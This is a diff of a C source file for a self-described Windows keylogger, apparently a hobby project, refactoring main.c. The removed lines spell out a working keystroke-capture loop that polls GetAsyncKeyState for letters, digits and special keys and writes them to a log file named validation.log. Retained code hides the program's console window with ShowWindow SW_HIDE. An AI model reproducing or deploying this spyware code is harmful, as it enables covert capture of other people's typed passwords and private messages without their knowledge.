@@ -1,38 +1,31 @@
 /* #############################################################################
 ## DESCRIPTION: Building a simple Windows-Linux Keylogger.
-## NAME: keylogger.c
+## NAME: main.c
 ## AUTHOR: Lucca Pessoa da Silva Matos
 ## DATE: 14.04.2020
 ## VERSION: 1.1
 ## EXEMPLE:
-##     > gcc -o keylogger keylogger.c
+##     > gcc -o keylogger .\main.c keylogger.c
 ##############################################################################*/
 
 // =============================================================================
 // LIBRARYS
 // =============================================================================
 
-// C Library to perform Input/Output operations.
-#include <stdio.h>
-// C Library with General Utilities.
-#include <stdlib.h>
-// C Library that contains some definitions of functions to get and manipulete
-// data an time information.
-#include <time.h>
-// C Library that supports slocalization specific settings, such as
-// culture-specific data formats or country-specific currency symbols
-#include <locale.h>
-// C Library that contains declarations to all functions of Windows API
-#include <unistd.h>
-// Logger library.
 #include "log.c"
-// C Library bool.
+#include <time.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <locale.h>
+#include <unistd.h>
 #include <stdbool.h>
+#include "keylogger.h"
 
-// Import windows library if this system in WINDOWS.
-#if defined(_WIN32) || defined(_WIN64) || defined(__CYGWIN__) && !defined(_WIN32)
-  #include <windows.h>
-  #define IS_WINDOWS_VISIBLE 0
+#include <windows.h>
+#define IS_WINDOWS_VISIBLE 0
+
+#if defined ( __unix )
+  #error This code is OS windows dependant, cannot compile on another system
 #endif
 
 #define LOG_USE_COLOR
@@ -46,18 +39,14 @@ log_error(const char *fmt, ...);
 log_fatal(const char *fmt, ...);
 */
 
+time_t time_start, time_now, time_lastkey;
+
 // =============================================================================
 // CALL FUNCTIONS
 // =============================================================================
 
-void helper();
-void cabecalho();
-void set_portuguese();
-
 FILE *create_file();
 FILE *check_file_exist();
-
-bool check_file_pointer_exist();
 
 // =============================================================================
 // MAIN
@@ -68,7 +57,6 @@ int main(int argc, char const *argv[]){
   cabecalho();
 
   char dir[100] = "logs\\";
-
   char *file_name = "validation.log";
 
   strcat(dir, file_name);
@@ -94,51 +82,11 @@ int main(int argc, char const *argv[]){
       ShowWindow(loggerWindow, SW_HIDE);
     }
 
-    log_info("Sleeping 150...");
-
-    Sleep(150);
-
     log_info("Looping...");
 
-    int keylogger(void){
-      while(true){
-        // Letters loop ("A"=65, "Z"=90)
-        for(char i=65; i<91; i++){
-          if(GetAsyncKeyState(i)){
-            if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)){
-              fputc(i, file_pointer);
-            } else{
-              fputc(i+32, file_pointer);
-            }
-          }
-        }
-        // Numbers loops ("0"=48, "9"=57)
-        for(char i=48; i<57; i++){
-          if(GetAsyncKeyState(i)){
-            fputc(i, file_pointer);
-          }
-        }
-        // Special inputs
-        if(GetAsyncKeyState(VK_RETURN)){
-          fputs("[ENTER]\n", file_pointer);
-        } else if(GetAsyncKeyState(VK_TAB)){
-          fputs("[TAB]", file_pointer);
-        } else if(GetAsyncKeyState(VK_BACK)){
-          fputs("[BACKSPACE]", file_pointer);
-        } else if(GetAsyncKeyState(VK_SPACE)){
-          fputs("[SPACE]", file_pointer);
-        } else if(GetAsyncKeyState(VK_F10)){
-          fclose(file_pointer);
-          return 0;
-        }
-        fflush(file_pointer);
-        Sleep(100);
-      }
-    }
+    log_info("Call Keylogger...");
 
-    log_info("Call Keylogger Function...");
-
-    keylogger();
+    keylogger(file_pointer, dir, time_start, time_now, time_lastkey);
 
   #elif defined(__linux__)
     log_info("We are in a Linux System.");
@@ -156,18 +104,6 @@ int main(int argc, char const *argv[]){
 
 // =============================================================================
 // FUNCTIONS
-// =============================================================================
-
-void set_portuguese(void){
-  setlocale(LC_ALL, "Portuguese");
-}
-
-// =============================================================================
-
-bool check_file_pointer_exist(FILE *file_pointer){
-  return file_pointer ? true : false;
-}
-
 // =============================================================================
 
 FILE *create_file(const char *file_name){
@@ -195,31 +131,4 @@ FILE *check_file_exist(const char *file_name){
     FILE *file_pointer = create_file(file_name);
     return file_pointer;
   }
-}
-
-// =============================================================================
-
-void helper(void){
-  printf(
-    "\n"
-    "Usage:\n"
-    "     sudo ./keyloger [ -s | -f file] [-h]\n"
-    "\n"
-    "Options:\n"
-    "  -f    file    Path to the output file.\n"
-    "  -s            Print to stdout.\n"
-    "  -h            This help message.\n");
-  exit(EXIT_FAILURE);
-}
-
-// =============================================================================
-
-void cabecalho(void){
-  printf("\n**************************************************");
-  printf("\n*                                                *");
-  printf("\n*                                                *");
-  printf("\n* IMPLEMENTANDO SIMPLES KEYLOGGER - LUCCA PESSOA *");
-  printf("\n*                                                *");
-  printf("\n*                                                *");
-  printf("\n**************************************************\n\n");
 }
